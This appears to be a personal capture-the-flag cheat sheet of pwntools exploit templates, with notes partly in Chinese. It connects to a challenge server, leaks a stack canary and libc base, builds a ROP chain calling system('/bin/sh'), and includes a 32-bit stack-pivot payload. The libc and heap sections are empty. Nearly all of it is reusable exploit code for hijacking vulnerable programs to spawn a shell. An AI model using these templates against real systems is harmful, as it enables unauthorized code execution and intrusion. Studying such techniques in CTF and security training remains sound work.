simple
```python
from pwn import *


elf = context.binary = ELF("./chall")
p = process()
p = remote("34.45.81.67",16002)
     
gdb.attach(p)

p.sendline()
p.interactive()
```

lambda shortcut
```python
# -*- coding: utf-8 -*-
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./chall_patched"

#libc  = ELF('./libc.so.6', checksec=False)
#ld = ELF("ld-2.39.so")
exe = context.binary = ELF(pc)



scripts = """
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)
 
s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

payload = 

ti()
```

for leak stack + canary
```python
canary_offset = 0x49
payload += "a"*canary_offset
s(payload)
ru(b"a" * canary_offset)

leak=b'\x00'+rl().strip()
warn(f"Thread leak: {leak}")
canary = u64(leak[:8])
print("canary:",hex(canary))
leak_stack = u64(leak[8:]+b'\x00'*(8-len(leak[8:])))
print("leak_stack",hex(leak_stack))
libc_base = leak_stack + 0x200090
print("libc base",hex(libc_base))
libc.address=libc_base
```

build ROP with canary
attack payload 
就是 offset + canary + 随便 8 个 + ret + pop_rdi + bin_sh + system
可是我看到有人
就是 offset + canary + 随便 8 个 + pop_rdi + bin_sh + ret + system 也可以 
还有
我看到没有ret 也可以 ？？？？就以防万一 alignment 问题
```python
libc.address=libc_base
# dbg()

# ROP
rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

offset = 0x48
payload = b'a' * offset 
payload += p64(canary)
payload += b'b' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

s(payload)
```

stack mitigation templete
```python


payload = p32(0)                        # 伪造的 old ebp
payload += p32(system_plt_addr)        # ret 到 system()
payload += p32(0)                      # 伪造的返回地址 (cincai)
payload += p32(leak_bss+0x10)          # 参数："/bin/sh" 的地址
payload += b'/bin/sh\x00'              # 真正写入 "/bin/sh" 字符串
payload = payload.ljust(offset, b'\x00')  # 填满 overflow 前的部分
payload += p32(leak_bss)               # 栈迁移：将 esp 指向你构造的 payload（伪造栈帧）区域
payload += p32(leave_ret)              # 执行栈迁移：leave = mov esp, ebp; pop ebp;  ret
```

for libc
```

```

for heap
```

```
